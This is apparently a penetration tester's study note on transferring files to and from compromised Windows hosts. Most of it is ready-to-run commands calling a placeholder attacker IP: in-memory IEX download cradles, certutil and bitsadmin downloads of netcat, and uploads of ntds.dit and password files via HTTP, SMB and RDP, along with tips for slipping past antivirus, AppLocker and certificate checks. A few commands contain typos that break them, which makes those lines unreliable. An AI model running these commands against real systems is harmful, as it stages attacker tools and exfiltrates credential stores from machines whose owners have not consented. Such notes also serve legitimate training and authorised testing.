---
created: 09-02-2026
tags:
  - Windows_PrivEsc
  - Windows
---

## Windows file transfers

File transfers on Windows present fundamentally different challenges compared to [[Linux_file_transfers|Linux]]. 
Linux gives you a rich shell environment with scripting languages and powerful utilities available by default, but Windows often hands you a restricted Command Prompt or PowerShell session surrounded by execution policies, Windows Defender, AppLocker, and a layered defense architecture specifically designed to stop exactly what you're trying to do.

Challenges Windows presents:
- **PowerShell execution policies**
	- PowerShell may be configured to block script execution by default. Execution policies are not a security boundary and they can be bypassed, but this adds friction and may trigger alerts.
- **Antivirus and EDR (Endpoint Detection and Response)**
	- Windows Defender, AMSI (Antivirus Scan Interface), and commercial EDR solutions may actively monitor file creation, execution, and common attack patterns. Tools like `Invoke-Expression` (IEX) are heavily scrutinized.

- **Application Whitelisting**
	- AppLocker and Windows Defender Application Control (WDAC) restrict which binaries can execute and from which locations.

- **Mixed environments**
	- You might get CMD, PowerShell 2.0, PowerShell 5.1, or PowerShell 7 — each with different capabilities. And you will need to adapt.

To add up to this, there are often network restrictions in place. Most organizations usually allow outbound HTTP(S) traffic, but may block certain file types (like `.exe`, `.dll`, `.ps1`), block access to websites of specific categories, or whitelist domains that can be accessed.

But you still have options.

Windows file transfer methods:
- PowerShell:
	- `System.Net.WebClient`

PowerShell is your primary tool for file transfers. It's installed by default on Windows 7/Server 2008 R2 and later, supports both HTTP and FTP, and can perform fileless execution. But it's also heavily monitored — every PowerShell action can be logged, and AMSI scans scripts in memory before execution (see [this](https://print3m.github.io/blog/amsi-memory-patching-bypass)).

>[!tip]+ Common writable locations
> - `C:\Windows\Temp` (usually writable but monitored)
> - `C:\Windows\Tasks` (older systems, less common now)
> - `C:\Users\<username>\AppData\Local\Temp` (user-specific temp directories)
> - `C:\ProgramData` (often writable, but varies)
> - `C:\Windows\System32\spool\drivers\color` (historically writable and allowed by default AppLocker policies)

>[!tip]+
> If AppLocker blocks execution from `C:\Windows\Temp`, try `C:\Windows\System32\spool\drivers\color` or `C:\Windows\Tasks` User-writable directories outside restricted paths.
## File downloads using PowerShell `System.Net.WebClient`

PowerShell offers many file transfer options. In any PowerShell version, you can use the  [`System.Net.WebClient`](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) .NET class to download files over HTTP, HTTPS, or FTP.

The following [table](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes `WebClient` methods for downloading files:

| Method                                                                                                                      | Description                                                                                                                       |
| --------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| [`OpenRead`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Return the data from a resource as a [Stream](https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).        |
| [`OpenReadAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Return the data from a resource, without blocking the calling thread.                                                             |
| [`DownloadData`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Download data from a resource and return a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-6.0) array.   |
| [`DownloadDataAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Download data from a resource and return a Byte array, without blocking the calling thread.                                       |
| [`DownloadFile`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Download data from a resource to a local file.                                                                                    |
| [`DownloadFileAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Download data from a resource to a local file, without blocking the calling thread.                                               |
| [`DownloadString`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Download a [String](https://learn.microsoft.com/en-us/dotnet/api/system.string?view=net-6.0) from a resource and return a String. |
| [`DownloadStringAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Download a String from a resource, without blocking the calling thread.                                                           |
Different methods serve different operational needs. For example, `DownloadFile` saves files to disk and can handle binaries, and `DownloadString` downloads files as strings which can be used for fileless execution.

>[!tip]+
> 
> - To set up an HTTP server on your machine:
> 
> ```bash
> python3 -m http.server 8000
> ```
> 
> See [[Linux_file_transfers#Python HTTP server]] for more details.
### Downloading files to disk with `DownloadFile`

- [`DownloadFile`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0) downloads a file from a remote server and saves it to disk:

```powershell
(New-Object Net.WebClient).DownloadFile("http://<attacker_ip_address>/file.txt", "file.txt")
```

`DownloadFile` is a synchronous method — it occupies your shell until the download completes. If you need your shell back immediately, use `DownloadFileAsync`.

- [`DownloadFileAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0) starts the download and immediately returns; the operation continues in the background, so you can use the shell at that time:

```powershell
(New-Object Net.WebClient).DownloadFileAsync("http://<attacker_ip_address>/file.txt", "file.txt")
```

- To track when the download is complete:

```powershell
$wc = New-Object Net.WebClient
$wc.DownloadFileAsync("http://<attacker_ip_address>/file.txt", "file.txt")
Register-ObjectEvent $wc DownloadFileCompleted -Action { Write-Host "Download finished" -ForegroundColor Red }
```

This prints "Download finished" to the console upon completion.
### File-less execution with `DownloadString`

Instead of writing a script to disk where it can be scanned by antivirus, you can download it as string and execute **in-memory**.

- You can use [`DownloadString`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0) to retrieve file content as a string, and then [`Invoke-Expression`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) (aliased as `IEX`) to execute it:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<attacker_ip_address>/script.ps1")
```

- Alternatively, you can pipe the string to `IEX`:

```powershell
(New-Object Net.WebClient).DownloadString("http://<attacker_ip_address>/script.ps1") | IEX
```

>[!warning] Traditional antivirus solutions scan files written to disk. Fileless execution can bypass this layer. However, modern EDR solutions with behavioral detection and AMSI will still catch in-memory scripts.


>[!warning] `IEX` is heavily monitored by EDR; Windows Defender often flags it immediately.
>If `IEX` is blocked, try [`Invoke-Command`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.5) instead:
>```powershell
>$script = (New-Object Net.WebClient).DownloadString('http://<attacker_ip_address>/script.ps1')
Invoke-Command -ScriptBlock ([ScriptBlock]::Create($script))
>```

- To save the downloaded string to a file:

```powershell
(New-Object Net.WebClient).("http://<attacker_ip_address>/script.ps1") | Out-File script.ps1
```

- [`DownloadStringAsync`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) is the background version of `DownloadString`:

```powershell
$wc.DownloadStringAsync("http://<ip_address>/file.txt")
Register-ObjectEvent $wc DownloadStringCompleted -Action {
    $Event.SourceEventArgs.Result | Out-File file.txt
}
```

>[!warning] `DownloadString` and `DownloadStringAsync` are not binary-safe. They work for scripts and text files, but will corrupt binaries. For binary data, use `DownoadFile` or `DownloadData` instead.

### The `Invoke-WebRequest` cmdlet

Starting with PowerShell 3.0, Microsoft introduced the [`Invoke-WebRequest`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2), a more feature-rich HTTP client cmdlet. It's noticeably slower than `WebClient` but handles large files better, displays a progress bar, and provides more control over HTTP requests.

>[!tip]+
>- Check your PowerShell version:
>```powershell
>$PSVersionTable.PSVersion
>```
>If this returns nothing, you're on PowerShell 2.0 (no `Invoke-WebRequest`). You're likely dealing with an older system like Windows 7 or Server 2008; use `WebClient` instead.

`Invoke-WebRequest` has several aliases: `iwr`, `curl`, and `wget`. These are **not** the same as Linux `curl` or `wget` — simply aliases for the PowerShell cmdlet.

- Basic file download:

```powershell
Invoke-WebRequest http://<attacker_ip_address>/nc.exe -OutFile nc.exe
```

- `Invoke-WebRequest` can be used for file-less execution as well:

```powershell
IEX (iwr http://<attacker_ip_address>/sciprt.ps1).Content
```

- You can specify a proxy server with `-Proxy`:

```powershell
iwr http://<attacker_ip_address>/file.txt -OutFile file.txt -Proxy http://127.0.0.1:9000
```

>[!tip]+ SSL/TLS errors
>If you encounter SSL/TLS certificate errors, disable certificate validation for the session:
>```PowerShell
>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
>```
>This affects all HTTPS requests in the current PowerShell session. 
>To restore validation after your transfers:
>```powershell
>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
>```

>[!tip]+ Internet Explorer errors
>In case of Internet Explorer errors, add the `-UseBasicParsing` option:
>```PowerShell
>Invoke-WebRequest https://<attacker_ip_address>/script.ps1 -UseBasicParsing | IEX
>```
## PowerShell HTTP file uploads

>[!tip]+
>- Set up an HTTP upload server on your machine:
>```bash
>sudo python3 -m uploadserver --bin 0.0.0.0 80
>```
>See [[Linux_file_transfers#Uploading files from the target (HTTP `POST`)]] for details.

- You can use the [`Invoke-RestMethod`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.5) cmdlet (available since PowerShell 3.0) to upload files to the server:

```powershell
$fileContent = Get-Content 'C:\Windows\user\passwords.txt' -Raw
Invoke-RestMethod -Uri http://<attacker_ip_address>/upload -Method POST -Body $fileContent
```

Though this works only for text files, and will corrupt binaries like `.exe`, `.dll`, or database files.

>[!warning] `Invoke-RestMethod` is not binary-safe.

- For binary file uploads, use [`WebClient.UploadFile`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadfile?view=net-9.0):

```powershell
$client = New-Object System.Net.WebClient
$client.UploadFile('http://<attacker_ip_address>/upload', 'C:\Users\Administrator\ntds.dit')
```
## Living Off The Land: LOLBAS binaries

When PowerShell is not an option, you're left with default Microsoft-signed binaries. And some of them can be used for file transfers. 
These are called LOLBAS (Living Off the Land Binaries and Scripts) — legitimate Windows tools that can be abused for offensive purposes. You can find a great collection of those at [LOLBAS](https://lolbas-project.github.io/lolbas/).
### `certutil.exe`

[`certutil.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) is a certificate management tool installed as part of Certificate Services. It's digitally signed by Microsoft and included in default Windows installations. Among other features, it can download files.

- Basic download:

```powershell
certutil -urlcache -f http://<attacker_ip_address>/nc.exe nc.exe
```

>[!note]+ How it works
>`certutil` retrieves the file via HTTP/HTTPS, stores it in the URL cache., and then copes it to your specified location. This caching behavior is a side effect of its legitimate certificate download functionality.

- Split download (bypassing file size restrictions):

```powershell
certutil -urlcache -split -f http://<attacker_ip_address>/nc.exe nc.exe
```

>[!note] See [`Certutil.exe — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)

An actual [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) (living-off-the-land).

>[!warning] Modern EDR solutions flag `certutil` with `-urlcache` as suspicious. But it still works well against older antivirus solutions and in misconfigured environments.

>[!tip]+
>- Verify file integrity after the download:
>```powershell
>certutil -hashfile nc.exe SHA256
>```
>Compare the hash with the original file on your system. If they match, the transfer was successful.

- Clean up the URL cache:

```powershell
certutil -urlcache -split -f http://<attacker_ip_address>/nc.exe delete
```

### `bitsadmin`

[`bitsadmin`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin) is a command-line tool used for managing BITS (Background Intelligent Transfer Service) jobs; Windows uses them for downloading updates and large files in the background. It's another signed Microsoft binary commonly used for file transfers.

- Basic download:

```powershell
bitsadmin /transfer downloadJob /download /priority high http://<attacker_ip_address>/nc.exe C:\Windows\Temp\nc.exe
```

>[!note]+ Command breakdown
> - `/transfer downloadJob`: Create a new transfer job named `downloadJob`.
> - `/download`: Specifies the download mode (vs. `/upload`).
> - `/priority high`: Sets priority (options: `foreground`, `high`, `normal`, `low`).

>[!note] BITS jobs are designed for background transfers and can resume after network interruptions.

- Check jobs status:

```powershell
bitsadmin /list /allusers
```

- Remove completed jobs:

```powershell
bitsadmin /complete downloadJob
```

>[!note] See [`Bitsadmin.exe — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/).
## SMB file transfers

SMB (Server Message Block) is native to Windows and the most natural way to transfer files. It's also the least suspicious in network logs — SMB traffic is everywhere in Windows environments.

>[!tip]+
>- To set up an SMB server on your attacker machine, use [`impacket-smbserver.py`](https://github.com/fortra/impacket/blob/master/examples/smbserver.py):
>```bash
>sudo impacket-smbserver share $(pwd) -smb2support
>```
>
>
>- With authentication:
>```bash
>sudo impacket-smbserver share $(pwd) -smb2support -username user -password pass
>```
>See [[Linux_file_transfers#Impacket SMB server]] for more details.

>[!warning] Modern Windows versions (Windows 10 1709+ and Server 2019+) block unauthenticated guest access to SMB shares by default. You'll need to set up authentication and provide credentials.
### Accessing SMB from CMD

- List available shares:

```powershell
net view \\<attacker_ip_address>
```

- Copy a file from SMB share to local disk:

```powershell
copy \\<attacker_ip_address>\share\nc.exe C:\Windows\Temp\nc.exe
```

- Direct execution (without copying):

```powershell
\\<attacker_ip_address>\share\nc.exe
```

>[!note] Windows can execute binaries directly from UNC paths (network shares). This avoids writing to disk, same as file-less execution with `IEX`.

- With credentials (required for newer Windows versions):

```powershell
net use \\<attacker_ip_address>\share /user:user pass
```

```powershell
copy \\<attacker_ip_address>\share\nc.exe .
```

- Disconnect:

```powershell
net use \\<attacker_ip_address>\share /delete
```

### Accessing SMB from PowerShell

PowerShell has more elegant SMB handling through [`New-PSDrive`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.5):

- Mount SMB share as a drive letter:

```powershell
New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\<attacker_ip_address>\share"
```

This creates a new PowerShell drive `S:` that maps to your SMB share. You can interact with it like a local drive:

- Copy file:

```powershell
Copy-Item S:\nc.exe -Destination C:\Windows\Temp\nc.exe
```

- With credentials:

```powershell
$cred = New-Object System.Management.Automation.PSCredential('user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\<attacker_ip_address>\share" -Credential $cred
```

- Unmount the drive:

```powershell
Remove-PSDrive -Name "S"
```

### Uploading to SMB

- From CMD (single file):

```powershell
copy C:\Users\Administrator\ntds.dit \\<attacker_ip_address>\share\ntds.dit
```

- Recursive copy (entire directory):

```powershell
xcopy /s /e C:\Users\Administrator\Documents \\<attacker_ip_address>\share\docs\
```

`/s` copies directories and subdirectories except empty ones. `/e` includes empty directories.

- From PowerShell:

```powershell
Copy-Item C:\Users\Administrator\ntds.dit -Destination \\<attacker_ip_address>\share\ntds.dit
```

- Recursive copy:

```powershell
Copy-Item -Recurse C:\Users\Administrator\Documents -Destination \\<attacker_ip_address>\share\docs\
```

## FTP transfers

FTP is legacy but still present on many Windows systems, especially older ones. It's also useful when SMB is blocked or unavailable.

>[!tip]+
>- To set up an FTP server on your attacker machine, use  [`pyftpdlib`](https://pyftpdlib.readthedocs.io/en/latest/tutorial.html):
>```bash
>python3 -m pyftpdlib --bind 0.0.0.0 --port 21
>```
>See [[Linux_file_transfers#Python FTP server]] for more.

- Interactive FTP session:

```powershell
ftp <attacker_ip_address>
```

This opens an interactive FTP client. Log in as `anonymous` with any password (or use credentials if you set them). Commands are the same as for the Linux `ftp` client — see [[Linux_file_transfers#FTP]] for reference.


- For non-interactive sessions (such as when using a web shell), you can create a script with FTP commands:

```powershell
echo open <attacker_ip_address> > ftp_script.txt
echo anonymous >> ftp_script.txt
echo password >> ftp_script.txt
echo binary >> ftp_script.txt
echo get nc.exe >> ftp_script.txt
echo bye >> ftp_script.txt
```

- Run the script:

```powershell
ftp -s:ftp_script.txt
```

The `-s:filename` option tells `ftp` to read commands from a file. This is useful for non-interactive transfers.

- One-liner version:

```powershell
(echo open <attacker_ip_address> & echo anonymous & echo password & echo binary & echo get nc.exe & echo bye) > ftp_script.txt & ftp -s:ftp_script.txt & del ftp_script.txt
```

## WebDAV transfers

WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension for file management. Windows has native WebDAV support through the `WebClient` service.

WebDAV tunnels over HTTP/HTTPS, which is often allowed by firewalls. It's also less commonly monitored than SMB.

>[!warning] For this technique to work, the `WebClient` service must be running, which is not always the case. If it's stopped and you lack admin privileges, WebDAV won't work.

On your attacker machine, start a WebDAV server:

- Install [`wsgidav`]([https://www.kali.org/tools/wsgidav/](https://pypi.org/project/WsgiDAV/)):

```bash
pip3 install wsgidav
```

- Start the server:

```bash
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/share --auth=anonymous
```

- With authentication:

```bash
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/share --auth=simple-dc --username=user --password=pass
```

### Accessing WebDAV from Windows

- Check if `WebClient` service is running:

```powershell
sc query webclient
```

- If it's not running, start it (requires administrator privileges):

```bash
sc start webclient
```

- Map WebDAV share:

```powershell
net use X: http://<atacker_ip_address>/
```

- Copy files:

```powershell
copy X:\nc.exe C:\Windows\Temp\nc.exe
```

- Disconnect:

```powershell
net use X: /delete
```

## Base64 encoding and manual transfers

When all network methods fail — highly restricted environments, air-gapped systems, or extreme firewall rules — you resort to manual data transfers with Base64 encoding and clipboard.

>[!tip]+
> - Base64-encode (Linux): 
> 
> ```bash
> base64 nc.exe > file.b64
> ```
> 
> - Decode (Linux):
> 
> ```bash
> base64 -d file.b64 > nc.exe
> ```
> 
>See [[Linux_file_transfers#Clipboard and Base64]].

### Base64 in PowerShell

- Base64-encode:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("nc.exe")
[Convert]::ToBase64String($bytes)
```

This first reads the file as raw bytes and then prints Base64 to the screen.

- Save Base64 to a file:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("nc.exe")
$b64 = [Convert]::ToBase64String($bytes)
$b64 | Out-File file.b64
```

- Base64-decode to a file:

```powershell
$b64 = Get-Content file.b64
$bytes = [Convert]::FromBase64String($b64)
[System.IO.File]::WriteAllBytes("nc.exe", $bytes)

```

- Base64-encode a string:

```powershell
[Convert]::ToBase64String(
  [Text.Encoding]::UTF8.GetBytes("whoami")
)
```

- Decode a Base64 string:

```powershell
[Text.Encoding]::UTF8.GetString(
  [Convert]::FromBase64String("d2hvYW1p")
)
```

- File-less Base64 decode + execute:

```powershell
IEX (
  [Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String("<base64_here>")
  )
)
```

### Base64 with `certutil`

- Base64-encode a file:

```powershell
certutil -encode nc.exe file.base64
```

- Decode a Base64-encoded file:

```powershell
certutil -decode file.base64 nc.exe
```

>[!note] See [`Certutil.exe — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Certutil), [`encode`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/#encode) and [`decode`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/#decode).

>[!note]+ `certutil` Base64 format includes headers (`-----BEGIN CERTIFICATE-----`). Strip them:
>```powershell
>type file.b74 | findstr /v "CERTIFICATE" > file_clean.b64
>certutil -decode file_clean.b64 nc.exe
>```

>[!tip] You can use `certutil` in CMD as well, since CMD doesn't have native Base64.

>[!warning] Windows CMD has a maximum string length of 8,191 characters. It may not always be possible to use this technique for large strings.

>[!note]+ Calculating MD5 file hashes on Linux and Windows 
>To verify file integrity (i.e., that the file copied to the target is exactly the same as on your machine), you can calculate and compare MD5 hashes of the files.
>- Linux:
> ```bash
> md5sum id_rsa
> ```
> ```bash
> 855fa4969b790b8f33d9596efad9d25b  id_rsa
> ```
>See [`md5sum — man pages`](https://man.archlinux.org/man/md5sum.1.en).
>
>- Windows:
>```PowerShell
>Get FileHash C:\Users\Public\id_rsa -Algorithm md5
>```
>```PowerShell
>Algorithm       Hash                                Path
>---------       ----                                ----
>MD5             855fa4969b790b8f33d9596efad9d25b    C:\Users\Public\id_rsa
>```
>See [`Get-FileHash — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
## VBScript and JScript

On extremely locked-down systems where PowerShell is blocked or audited, fall back to VBScript or JScript.
They're legacy Windows scripting engines, often less monitored than PowerShell. They also predate modern AMSI scanning.
### VBScript

- VBScript HTTP download:

```VBScript 
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objXMLHTTP.open "GET", "http://<attacker_ip_address>/nc.exe", False
objXMLHTTP.send

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "C:\Windows\Temp\nc.exe", 2
    objADOStream.Close
    Set objADOStream = Nothing
End If

Set objXMLHTTP = Nothing
```

- Execute: 

```powershell
cscript download.vbs
```

- One-liner:

```powershell
echo Set x=CreateObject("MSXML2.ServerXMLHTTP"):x.open "GET","http://<attacker_ip_address>/nc.exe",0:x.send:Set s=CreateObject("ADODB.Stream"):s.Open:s.Type=1:s.Write x.ResponseBody:s.SaveToFile "nc.exe",2 > dl.vbs & cscript dl.vbs & del dl.vbs
```

### JScript

- JScript HTTP download:

```powershell
var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
xhr.open("GET", "http://<attacker_ip_address>/nc.exe", false);
xhr.send();

var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1; // Binary
stream.Write(xhr.ResponseBody);
stream.SaveToFile("C:\\Windows\\Temp\\nc.exe", 2); // Overwrite
stream.Close();
```

- Execute: 

```powershell
cscript download.js
```
## RDP-based file transfers 

If you have Remote Desktop Protocol (RDP) access, you can use its built-in features to transfer files — clipboard sharing and drive redirection.
### RDP clipboard sharing

- Connect with clipboard sharing from Linux (`xfreerdp`):

```bash
xfreerdp /v:<target_ip_address> /u:Administrator /p:password /clipboard
```

The `/clipboard` parameter enables clipboard sharing between your local machine and the RDP session.

- `rdesktop`:

```bash
rdesktop -r clipboard:PRIMARYCLIPBOARD <target_ip_address>
```

Clipboard sharing in Windows RDP client is **enabled by default**.

>[!note] To transfer binaries, Base64-encode first; refer to [[#Base64 encoding and manual transfers]].

### RDP drive sharing

You can mount your local filesystem as a network drive in the RDP session:

- Mount a local directory as a drive on the RDP session from Linux (`xfreerdp`):

```bash
xfreerdp /v:<target_ip_address> /u:Administrator /p:password /drive:share,/path/to/local/dir
```

The `/drive:share,/path/to/local/dir` parameter mounts your specified local directory as a network share named `share` inside the RDP session.

- In the RDP session, access via:

```powershell
dir \\tsclient\share
```

```powershell
copy \\tsclient\share\nc.exe C:\Windows\Temp\nc.exe
```

Your local filesystem appears as a network share (`\\tsclient\`) inside the RDP session.

- Uploading from target:

```powershell
copy C:\Users\victim\passwords.txt \\tsclient\share\loot\
```

Files copied to `\\tsclient\share` appear in your local mounted directory.

## References and further reading

- [`DownloadCradles.ps1 — HarmJ0y, GitHub Gist`](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

- [`Certutil.exe — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
- [`Bitsadmin.exe — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
  
  
- [`File Transfer Cheatsheet: Windows and Linux — Hacking Articles`](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
- [`Linux File Transfers for Hackers — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/linux-file-transfers-for-hackers)


- [`Now you see me: Exposing fileless malware — Microsoft Defender Security Research Team`](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/)
- [`Dismantling a fileless campaign: Microsoft Defender ATP's Antivirus exposes Astaroth attack — Microsoft Defender Security Research Team`](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

- [`WMIC: WMI command-line unitiltiy — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)
- [`BITSAdmin tool — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)
- [`certutil — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [`regsvr32 — Microsoft Learn`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)

- [`.LNK File Extension — FileInfo.com`](https://fileinfo.com/extension/lnk)

